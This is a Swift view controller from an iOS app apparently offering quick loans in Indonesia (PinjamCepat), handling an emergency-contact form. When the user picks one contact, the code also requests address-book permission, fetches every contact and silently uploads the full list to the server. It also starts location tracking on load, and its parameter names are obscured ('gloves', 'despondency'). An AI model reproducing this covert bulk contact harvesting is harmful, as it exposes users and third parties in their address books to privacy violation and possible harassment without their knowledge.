//
//  ContactViewController.swift
//  PinjamCepat
//
//  Created by hekang on 2026/3/25.
//

import UIKit
import SnapKit
import Combine
import MJRefresh
import RxSwift
import RxCocoa
import TYAlertController

class ContactViewController: BaseViewController {
    
    private var viewModel = ContactViewModel()
    
    var modelArray: [nationsModel] = []
    
    private var entertime: String = ""
    
    var stepModel: recordModel? {
        didSet {
            guard let stepModel = stepModel else { return }
            headView.nameLabel.text = stepModel.vowed ?? ""
        }
    }
    
    var cardModel: linesModel? {
        didSet {
            
        }
    }
    
    lazy var headImageView: UIImageView = {
        let headImageView = UIImageView()
        headImageView.image = UIImage(named: "end_foc_image")
        return headImageView
    }()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.setTitle("Next".localized, for: .normal)
        nextBtn.titleLabel?.font = .systemFont(ofSize: 20, weight: .bold)
        nextBtn.setBackgroundImage(UIImage(named: "app_btn_bg_image"), for: .normal)
        nextBtn.adjustsImageWhenHighlighted = false
        return nextBtn
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.estimatedRowHeight = 60
        tableView.delegate = self
        tableView.dataSource = self
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.rowHeight = UITableView.automaticDimension
        tableView.register(ContactViewCell.self, forCellReuseIdentifier: "ContactViewCell")
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        view.addSubview(headView)
        headView.snp.makeConstraints { make in
            make.top.equalTo(view.safeAreaLayoutGuide)
            make.left.right.equalToSuperview()
            make.height.equalTo(44)
        }
        
        headView.backBlock = { [weak self] in
            self?.toProductVc()
        }
        
        view.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 293.pix(), height: 58.pix()))
            make.bottom.equalTo(view.safeAreaLayoutGuide).offset(-10.pix())
        }
        
        view.addSubview(headImageView)
        
        headImageView.snp.makeConstraints { make in
            make.top.equalTo(headView.snp.bottom).offset(5)
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 335.pix(), height: 58.pix()))
        }
        
        nextBtn
            .rx
            .tap
            .throttle(.milliseconds(200), scheduler: MainScheduler.instance)
            .bind(onNext: { [weak self] in
                guard let self = self else { return }
                var listArray: [[String: String]] = []
                for model in modelArray {
                    var parameters: [String: String] = [:]
                    parameters["jest"] = model.jest ?? ""
                    parameters["destiny"] = model.destiny ?? ""
                    parameters["afterthought"] = model.afterthought ?? ""
                    listArray.append(parameters)
                }
                let jsonStr = jsonString(from: listArray)
                let parameters = ["despondency": cardModel?.whimseys ?? "",
                                  "gloves": jsonStr]
                viewModel.saveListInfo(parameters: parameters)
            })
            .disposed(by: disposeBag)
        
        view.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.top.equalTo(headImageView.snp.bottom).offset(20)
            make.left.right.equalToSuperview()
            make.bottom.equalTo(nextBtn.snp.top).offset(-5)
        }
        
        entertime = String(Int(Date().timeIntervalSince1970))
        
        locationManager.startLocation { _ in }
        
        bindViewModel()
        
        getListInfo()
    }
    
}

extension ContactViewController {
    
    private func bindViewModel() {
        viewModel.$model
            .receive(on: DispatchQueue.main)
            .compactMap { $0 }
            .sink { [weak self] model in
                guard let self else { return }
                let portent = model.portent ?? ""
                if portent == "0" {
                    self.modelArray = model.gloves?.nations ?? []
                    self.tableView.reloadData()
                }
            }
            .store(in: &cancellables)
        
        viewModel.$errorMsg
            .receive(on: DispatchQueue.main)
            .compactMap { $0 }
            .sink { _ in
                
            }
            .store(in: &cancellables)
        
        viewModel.$saveModel
            .receive(on: DispatchQueue.main)
            .compactMap { $0 }
            .sink { [weak self] model in
                guard let self else { return }
                let portent = model.portent ?? ""
                if portent == "0" {
                    self.trackAppInfo(step: "6", entertime: entertime, orderID: "")
                    self.toProductDetailInfo(cardModel: cardModel ?? linesModel())
                }else {
                    ToastManager.showMessage(model.henceforward ?? "")
                }
            }
            .store(in: &cancellables)
    }
    
    private func getListInfo() {
        if let cardModel = cardModel {
            let parameters = ["despondency": cardModel.whimseys ?? ""]
            viewModel.listInfo(parameters: parameters)
        }
        
    }
    
}

extension ContactViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return self.modelArray.count
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = self.modelArray[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "ContactViewCell", for: indexPath) as! ContactViewCell
        let nameStr = String(format: "kontak_image_0%d", indexPath.row + 1)
        cell.configeImageView(nameStr: nameStr)
        cell.model = model
        cell.oneBlock = { [weak self] text in
            guard let self = self else { return }
            
            let popView = AppSheetSelectView(frame: self.view.bounds)
            
            popView.nameStr = model.distinctly ?? ""
            
            let modelArray = model.write ?? []
            
            popView.modelArray = modelArray
            
            for (index, model) in modelArray.enumerated() {
                if model.jest == text {
                    popView.selectedIndex = IndexPath(row: index, section: 0)
                }
            }
            
            let alertVc = TYAlertController(alert: popView, preferredStyle: .actionSheet)
            
            self.present(alertVc!, animated: true)
            
            popView.cancelChanged = { [weak self] in
                self?.dismiss(animated: true)
            }
            
            popView.onDateChanged = { [weak self] writeModel in
                guard let self else { return }
                self.dismiss(animated: true)
                cell.oneFiled.text = writeModel.jest ?? ""
                model.destiny = writeModel.led ?? ""
            }
            
        }
        cell.twoBlock = { [weak self] in
            guard let self = self else { return }
            ContactManager.shared.pickSingleContact(from: self) { result in
                let phone = result["thank"] ?? ""
                let name = result["jest"] ?? ""
                if phone.isEmpty || name.isEmpty {
                    ToastManager.showMessage("Nama atau nomor telepon tidak boleh kosong, silakan pilih kembali")
                    return
                }
                cell.twoFiled.text = "\(name)\("-")\(phone)"
                model.jest = name
                model.afterthought = phone
            }
            ContactManager.shared.requestPermission { granted in
                if granted {
                    ContactManager.shared.fetchAllContacts { [weak self] list in
                        guard let self = self else { return }
                        let jsonStr = jsonString(from: list)
                        let parameters = ["despondency": cardModel?.whimseys ?? "",
                                          "gloves": jsonStr]
                        viewModel.uploadListInfo(parameters: parameters)
                    }
                }
            }
        }
        
        return cell
    }
    
}

extension ContactViewController {
    
    private func jsonString(from list: [[String: String]]) -> String {
        guard JSONSerialization.isValidJSONObject(list),
              let data = try? JSONSerialization.data(withJSONObject: list, options: [.prettyPrinted, .sortedKeys]) else {
            return ""
        }
        return String(data: data, encoding: .utf8) ?? ""
    }
    
}
